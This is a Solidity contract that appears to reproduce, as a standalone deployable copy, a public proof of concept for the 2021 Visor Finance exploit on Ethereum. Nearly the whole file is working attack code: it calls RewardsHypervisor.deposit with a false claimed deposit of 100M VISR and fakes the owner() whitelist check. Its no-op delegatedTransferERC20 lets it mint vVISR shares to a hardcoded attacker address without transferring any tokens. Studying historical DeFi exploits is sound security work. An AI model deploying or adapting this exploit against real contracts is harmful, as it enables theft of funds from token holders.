// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2021-12-Visor).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract — the
// test contract IS the attacker's `from` vault (it implements owner() returning
// address(this) and an empty delegatedTransferERC20), so there is no standalone
// contract to deploy. This contract is a faithful, self-contained copy of that
// inline attack so the playground can deploy it and record run(). Logic and the
// 1e26 "claimed deposit" constant are copied verbatim from test/Visor_exp.sol.
//
// Root cause: RewardsHypervisor.deposit mints vVISR shares from a CLAIMED
// visrDeposit while trusting an attacker-controlled `from` contract to (a)
// self-report owner() == msg.sender and (b) actually move VISR via
// delegatedTransferERC20 — which the attacker implements as an empty no-op. Zero
// VISR is transferred, yet shares mint as if 100M VISR arrived.

interface IRewardsHypervisor {
    function deposit(uint256 visrDeposit, address payable from, address to) external returns (uint256 shares);
}

interface IvVISR {
    function balanceOf(address) external view returns (uint256);
}

contract VisorFreeMint {
    // Historical attacker EOA — receives the free-minted vVISR (deposit's `to`).
    address constant ATTACKER = 0x8EF73f1828D7EaAe80b8Dc55A8c9f4576A4D6D6E;
    IRewardsHypervisor constant HYPERVISOR = IRewardsHypervisor(0xC9f27A50f82571C1C8423A42970613b8dBDA14ef);
    IvVISR constant vVISR = IvVISR(0x3a84aD5d16aDBE566BAA6b3DafE39Db3D5E261E5);

    // 100,000,000 VISR — a pure lie. The attacker deposits ZERO VISR but claims this.
    uint256 constant CLAIMED_DEPOSIT = 100_000_000_000_000_000_000_000_000; // 1e26

    function run() external {
        // deposit(claimed, from=this, to=ATTACKER). `from` is THIS contract, so the
        // hypervisor calls back into owner() / delegatedTransferERC20 below: the
        // whitelist gate passes vacuously and the delegated "transfer" is a no-op.
        HYPERVISOR.deposit(CLAIMED_DEPOSIT, payable(address(this)), ATTACKER);
    }

    // Whitelist gate: RewardsHypervisor requires IVisor(from).owner() == msg.sender.
    // `from` is us and msg.sender is us (we are the caller of deposit), so returning
    // address(this) satisfies the check — a vacuous gate the attacker fully controls.
    function owner() external returns (address) {
        return address(this);
    }

    // The ONLY mechanism that moves VISR on the contract path — and it calls into
    // attacker code. Empty: 0 VISR moves, yet the hypervisor mints shares anyway.
    function delegatedTransferERC20(address token, address to, uint256 amount) external {}
}
